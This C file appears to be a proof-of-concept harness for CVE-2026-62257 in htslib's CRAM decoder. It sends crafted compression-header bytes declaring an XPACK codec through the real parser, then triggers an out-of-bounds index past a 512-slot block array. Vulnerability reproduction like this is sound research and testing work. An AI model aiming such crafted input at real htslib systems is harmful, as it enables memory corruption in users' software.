/*
 * Parser-path harness for CVE-2026-62257.
 *
 * Difference from frontier harness.c: the compression header is NOT a
 * stand-in struct with hdr->ncodecs set directly.  It is a byte stream in
 * the real CRAM v4 compression-header wire format, decoded by the real
 * cram_decode_compression_header() from cram/cram_decode.c:144.  The XPACK
 * codec and its codec_id therefore arise from file-derived bytes through
 * the actual parser, not from a direct cram_decoder_init() call.
 *
 * The only remaining stand-in is the 512-entry block_by_id allocation,
 * copied verbatim in shape from pinned cram_io.c:4620.
 */
#define HTS_BUILDING_LIBRARY 1
#include <config.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "cram/cram.h"
#include "cram/cram_codecs.h"
#include "cram/cram_structs.h"

/* uint7 varint readers, same shape as fd->vv in a real CRAM v4 stream. */
static int64_t vv_get32(char **cp, const char *endp, int *err) {
    uint64_t v = 0; int shift = 0;
    while (*cp < endp) {
        unsigned char c = (unsigned char)*(*cp)++;
        if (c & 0x80) { v |= (uint64_t)(c & 0x7f) << shift; shift += 7; }
        else { v |= (uint64_t)c << shift; return (int64_t)v; }
    }
    if (err) *err = 1;
    return 0;
}
static int64_t vv_get64(char **cp, const char *endp, int *err) {
    return vv_get32(cp, endp, err);
}

int main(void) {
    /* CRAM_MAJOR_VERS(v) = v>>8 in cram_structs.h:207; 4.0 => 0x0400. */
    cram_fd *fd = calloc(1, sizeof(*fd));
    fd->version = 4 << 8;
    fd->vv.varint_get32 = vv_get32;
    fd->vv.varint_get64 = vv_get64;

    /* Real CRAM v4 compression-header wire bytes.
     *  preservation map : size=1 (count byte), count=0
     *  record enc map   : size=12 (count + 11-byte entry), count=1,
     *                     key "QS", encoding=51 (E_XPACK), size=7, params
     *                     {nbits=4,nval=2,rmap 0,1,
     *                      sub=E_EXTERNAL, sub_size=1, id=0}
     *  tag enc map      : size=1 (count byte), count=0
     */
    unsigned char ch[] = {
        0x01, 0x00,
        0x0c, 0x01,
        0x51, 0x53,
        0x33,
        0x07,
        0x04, 0x02, 0x00, 0x01, 0x01, 0x01, 0x00,
        0x01, 0x00
    };

    cram_block *b = calloc(1, sizeof(*b));
    b->method = RAW;
    b->data = (char *)ch;
    b->alloc = sizeof(ch);
    b->uncomp_size = sizeof(ch);

    cram_block_compression_hdr *hdr = cram_decode_compression_header(fd, b);
    printf("INFO hdr=%p\n", (void *)hdr);
    if (!hdr) { printf("RESULT FAIL (compression header rejected)\n"); return 2; }
    printf("INFO ncodecs=%d after real parser\n", hdr->ncodecs);

    cram_codec *c = hdr->codecs[DS_QS];
    printf("INFO QS codec=%p codec_id=%d encoding=%d\n",
           (void *)c, c ? c->codec_id : -1, c ? c->codec : -1);
    if (!c) { printf("RESULT FAIL (no QS codec)\n"); return 2; }

    /* As in pinned cram_io.c:4620, 512 pointer slots indexed 0..511. */
    cram_slice *slice = calloc(1, sizeof(*slice));
    slice->block_by_id = calloc(512, sizeof(slice->block_by_id[0]));

    /* In-bounds source block for the XPACK EXTERNAL sub-codec, content_id 0. */
    cram_block *sub = cram_new_block(EXTERNAL, 0);
    sub->data = malloc(16);
    sub->alloc = 16;
    sub->uncomp_size = 8;
    memset(sub->data, 0x5a, 16);
    slice->block_by_id[0] = sub;

    printf("INFO calling get_block -> cache index 512+codec_id=%d\n",
           512 + c->codec_id);
    cram_block *r = c->get_block(slice, c);
    printf("INFO get_block returned %p\n", (void *)r);
    printf("RESULT PASS\n");
    return 0;
}
